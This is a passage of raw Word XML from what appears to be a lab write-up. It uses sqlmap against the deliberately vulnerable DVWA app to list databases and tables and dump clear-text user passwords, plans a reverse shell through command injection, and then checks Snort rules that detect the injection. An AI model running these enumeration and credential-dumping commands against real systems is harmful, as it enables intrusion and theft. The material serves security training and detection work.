      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>dbs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> check for what of database for example </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>mysql,mssql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="005B1902" w:rsidRDefault="005B1902" w:rsidP="005B1902">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">--batch </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">answer yes </w:t>
      </w:r>
      <w:r w:rsidR="006F30CC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>automatically when</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> answer</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006F30CC" w:rsidRPr="001B1649" w:rsidRDefault="006F30CC" w:rsidP="005B1902">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1E8BDF8D" wp14:editId="770BECFA">
            <wp:extent cx="5112327" cy="4988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4439" cy="5000479"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="006F30CC" w:rsidRDefault="006F30CC" w:rsidP="00536E41">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">As we can see </w:t>
      </w:r>
      <w:r w:rsidR="009259EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r w:rsidR="009259EE" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>the picture above</w:t>
      </w:r>
      <w:r w:rsidR="009259EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> we obtain</w:t>
      </w:r>
      <w:r w:rsidR="009259EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ed</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and dump</w:t>
      </w:r>
      <w:r w:rsidR="009259EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ed</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> names of the databases</w:t>
      </w:r>
      <w:r w:rsidR="009259EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009259EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>et</w:t>
      </w:r>
      <w:r w:rsidR="009259EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">s continue use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and see what more information </w:t>
      </w:r>
      <w:r w:rsidR="00DF2335">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>we can get to accomplish our goal</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF2335" w:rsidRPr="001B1649" w:rsidRDefault="00DF2335" w:rsidP="00DF2335">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7785C062" wp14:editId="613272A6">
            <wp:extent cx="5486400" cy="3626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626485"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF2335" w:rsidRPr="001B1649" w:rsidRDefault="00DF2335" w:rsidP="00DF2335">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="525"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Command: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> -r </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sql.req</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> -D </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>dvwa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> –tables</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF2335" w:rsidRDefault="00DF2335" w:rsidP="00DF2335">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="525"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>This time we run with the switches –D which means the name of datab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">se that we found already and –tables it’s for dump the tables from the database. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> As we can </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>can</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ses</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> above this time we found users and guestbook.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF2335" w:rsidRDefault="00DF2335" w:rsidP="00944C35">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="525"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251660288" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="5EC276A6" wp14:editId="654E9EE3">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>370840</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5486400" cy="93916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6400" cy="939165"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="59A2B0C0" wp14:editId="51639475">
            <wp:extent cx="1730247" cy="16192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9828" cy="1646933"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF2335" w:rsidRDefault="00DF2335" w:rsidP="00DF2335">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Now the</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> attacker</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>found</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> also the columns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> names</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">name of column: </w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>passwords let’s try continue enumerate and see what we can dump more</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF2335" w:rsidRDefault="00DF2335" w:rsidP="00DF2335">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="41F5A7C7" wp14:editId="083261DA">
            <wp:extent cx="5486400" cy="1052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052195"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF2335" w:rsidRDefault="00DF2335" w:rsidP="00DF2335">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="13E24C43" wp14:editId="6B946D38">
            <wp:extent cx="4895850" cy="1952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850" cy="1952625"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF2335" w:rsidRPr="001B1649" w:rsidRDefault="00DF2335" w:rsidP="00536E41">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve"> It Works! </w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>we grab all users</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and passwords</w:t>
      </w:r>
      <w:r w:rsidR="0097641D">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> in clear text we successfully dumped all the interesting information from the target</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0097641D" w:rsidRPr="001B1649" w:rsidRDefault="0097641D" w:rsidP="0097641D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Now</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> we </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">found </w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>the admin credentials from here we need try get shell on this box and then we can enumerate more. So as we remember we got DVWA and on this platform there is page called</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0097641D" w:rsidRDefault="0097641D" w:rsidP="0097641D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>OS command injecti</w:t>
      </w:r>
      <w:r w:rsidR="004B0A94">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">on we can try get reverse shell on this box. but before </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="004B0A94">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>lets</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="004B0A94">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> check our defense systems and see what they can catch from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="004B0A94">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004B0A94">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> injection attack we did.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004B0A94" w:rsidRDefault="004B0A94" w:rsidP="0097641D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C62B0F" w:rsidRDefault="00C62B0F" w:rsidP="00C62B0F">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>SQ</w:t>
      </w:r>
      <w:r w:rsidR="004B0A94">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>L Injection Detection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C62B0F" w:rsidRDefault="00C62B0F" w:rsidP="00C62B0F">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C62B0F" w:rsidRPr="00C62B0F" w:rsidRDefault="00C62B0F" w:rsidP="00C62B0F">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4C5667F0" wp14:editId="50F82BDD">
            <wp:extent cx="5486400" cy="1689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689735"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="004B0A94" w:rsidRDefault="009259EE" w:rsidP="00536E41">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidR="00C62B0F">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">bove </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">is </w:t>
      </w:r>
      <w:r w:rsidR="00C62B0F">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">our snort rules for detecting </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C62B0F">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C62B0F">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> injection attacks</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C62B0F" w:rsidRDefault="00C62B0F">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">The rules pretty simple with the </w:t>
      </w:r>
      <w:r w:rsidR="009259EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>common</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> content which us</w:t>
      </w:r>
      <w:r w:rsidR="009259EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">ed a lot when performing </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> injection attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C62B0F" w:rsidRDefault="00C62B0F" w:rsidP="00C62B0F">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="156DFC6B" wp14:editId="37794E1E">
            <wp:extent cx="5486400" cy="39185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918585"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C62B0F" w:rsidRDefault="00C62B0F" w:rsidP="004B0A94">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="004B0A94" w:rsidRPr="006025E3" w:rsidRDefault="004B0A94" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Great! Our snort rules on </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> injection works fine as we can see from the picture we got a lot of alerts about types of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> injection attacks like: error based, </w:t>
      </w:r>
      <w:r w:rsidR="00970C8A" w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>and,</w:t>
      </w:r>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> or.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004B0A94" w:rsidRDefault="004B0A94" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">As we can see the attack come from 10.0.0.14 which is our attacker that runs </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
